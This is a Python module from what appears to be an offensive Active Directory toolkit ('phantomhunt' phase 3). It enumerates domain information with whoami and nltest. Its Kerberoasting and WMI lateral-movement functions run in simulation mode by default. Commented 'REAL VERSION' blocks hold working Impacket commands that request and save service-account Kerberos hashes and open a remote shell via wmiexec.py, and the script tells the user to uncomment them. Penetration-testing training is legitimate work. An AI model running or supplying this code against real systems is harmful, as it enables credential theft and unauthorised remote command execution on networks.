# phantomhunt/modules/phase3.py
import subprocess
import os
import getpass
from rich.console import Console
from rich.table import Table

console = Console()


def get_domain_info():
    """Basic domain enumeration using whoami /all and nltest"""
    console.print("\n[bold cyan]=== PHASE 3: DOMAIN ENUMERATION ===[/]")

    table = Table(title="Domain Information")
    table.add_column("Item")
    table.add_column("Value")

    try:
        whoami = subprocess.check_output("whoami /all", text=True, stderr=subprocess.STDOUT)
        for line in whoami.splitlines():
            if "User Name" in line or "Group Name" in line or "Logon Domain" in line or "SID" in line:
                parts = line.strip().split()
                if len(parts) >= 2:
                    table.add_row(parts[0], " ".join(parts[1:]))

        nltest = subprocess.check_output("nltest /dsgetdc:", text=True, stderr=subprocess.STDOUT)
        for line in nltest.splitlines():
            if "DC:" in line or "Domain:" in line or "Address:" in line or "Dom Guid:" in line:
                parts = line.split(":", 1)
                if len(parts) == 2:
                    table.add_row(parts[0].strip(), parts[1].strip())

        console.print(table)

    except Exception as e:
        console.print(f"[red]Error getting domain info: {e}[/]")
        console.print("[yellow](Are you running this on a domain-joined Windows machine as a domain user?)[/]")


def find_kerberoastable():
    """Kerberoasting - Simulation by default. Real code is commented below."""
    console.print("\n[bold yellow]=== Kerberoasting ===[/]")

    domain = input("Enter domain name (e.g. company.local): ").strip()
    username = input("Enter username (domain user): ").strip()
    password = getpass.getpass("Enter password: ")
    dc_ip = input("Enter Domain Controller IP: ").strip()

    if not domain or not username or not dc_ip:
        console.print("[red]Domain, username and DC IP are required.[/]")
        return

    # ============================================================
    # SIMULATION MODE (Safe - currently active)
    # ============================================================
    console.print("\n[yellow][SIMULATION MODE] Kerberoasting is currently simulated for safety.[/]")
    console.print(f"[green]Would request TGS for service accounts using:[/]")
    console.print(f"   Domain : {domain}")
    console.print(f"   User   : {username}")
    console.print(f"   DC IP  : {dc_ip}")

    table = Table(title="Kerberoasting Simulation")
    table.add_column("Step")
    table.add_column("Status")
    table.add_row("TGT Acquisition", "[yellow]Simulated[/]")
    table.add_row("TGS Request", "[yellow]Would be requested here[/]")
    table.add_row("Hash Extraction", "[yellow]Hash would be saved[/]")
    console.print(table)

    console.print("[cyan]To enable REAL Kerberoasting → uncomment the REAL VERSION block below.[/]")

    # ============================================================
    # REAL VERSION (Uncomment only in isolated lab environment)
    # ============================================================
    # console.print("\n[bold green][REAL MODE] Starting actual Kerberoasting with Impacket...[/]")
    # try:
    #     # Using GetUserSPNs.py from Impacket
    #     cmd = f'GetUserSPNs.py -request -dc-ip {dc_ip} {domain}/{username}:{password} -outputfile kerb_hashes.txt'
    #     console.print(f"[cyan]Executing: {cmd}[/]")
    #     result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    #
    #     if result.returncode == 0:
    #         console.print("[bold green][+] Kerberoasting completed successfully![/]")
    #         console.print("[green]Hashes saved to: kerb_hashes.txt[/]")
    #         if result.stdout:
    #             console.print(result.stdout)
    #     else:
    #         console.print(f"[red]Error: {result.stderr}[/]")
    #
    # except Exception as e:
    #     console.print(f"[red]Kerberoasting failed: {e}[/]")
    #     console.print("[yellow]Make sure Impacket is installed and GetUserSPNs.py is in your PATH.[/]")


def simple_lateral_attempt():
    """WMI Lateral Movement - Simulation by default. Real code is commented below."""
    console.print("\n[bold magenta]=== Lateral Movement (WMI) ===[/]")
    console.print("[red]!!! WARNING: Real version can execute commands on remote machines !!![/]")

    target = input("Target IP / Hostname: ").strip()
    username = input("Username (domain\\user or local): ").strip()
    password = getpass.getpass("Password: ")

    if not target or not username:
        console.print("[red]Target and username are required.[/]")
        return

    # ============================================================
    # SIMULATION MODE (Safe - currently active)
    # ============================================================
    console.print(f"\n[yellow][SIMULATION MODE] Lateral movement is currently simulated.[/]")
    console.print(f"[green]Would attempt WMI execution on {target} as {username}[/]")
    console.print("[cyan]To enable REAL lateral movement → uncomment the REAL VERSION block below.[/]")

    # ============================================================
    # REAL VERSION (Uncomment only in isolated lab environment)
    # ============================================================
    # console.print(f"\n[bold green][REAL MODE] Attempting WMI execution on {target}...[/]")
    # try:
    #     if "\\" in username:
    #         domain_part, user_part = username.split("\\", 1)
    #         auth = f"{domain_part}/{user_part}:{password}"
    #     else:
    #         auth = f"./{username}:{password}"
    #
    #     cmd = f'wmiexec.py {auth}@{target}'
    #     console.print(f"[cyan]Launching: {cmd}[/]")
    #     console.print("[green]You should get a semi-interactive shell. Type exit to quit.[/]\n")
    #
    #     os.system(cmd)
    #
    # except Exception as e:
    #     console.print(f"[red]Lateral movement failed: {e}[/]")
    #     console.print("[yellow]Make sure Impacket is installed and wmiexec.py is in your PATH.[/]")


def phase3():
    get_domain_info()
    find_kerberoastable()
    simple_lateral_attempt()


if __name__ == "__main__":
    phase3()